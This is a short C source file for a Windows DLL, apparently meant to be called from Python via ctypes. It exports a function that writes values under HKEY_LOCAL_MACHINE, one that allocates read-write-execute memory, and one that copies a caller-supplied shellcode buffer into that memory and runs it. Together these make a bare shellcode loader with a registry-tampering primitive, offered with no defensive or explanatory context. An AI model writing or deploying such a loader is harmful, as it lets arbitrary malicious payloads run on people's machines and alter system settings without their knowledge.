// system_layer.c
#include <windows.h>
#include <winternl.h>

// Exporta funções para Python via ctypes
__declspec(dllexport) void WriteRegistry(const char* key, const char* value) {
    HKEY hKey;
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)value, strlen(value));
    RegCloseKey(hKey);
}

__declspec(dllexport) void* AllocExecutableMemory(size_t size) {
    return VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
}

__declspec(dllexport) void ExecuteShellcode(void* shellcode, size_t size) {
    void* exec = AllocExecutableMemory(size);
    memcpy(exec, shellcode, size);
    ((void(*)())exec)();
}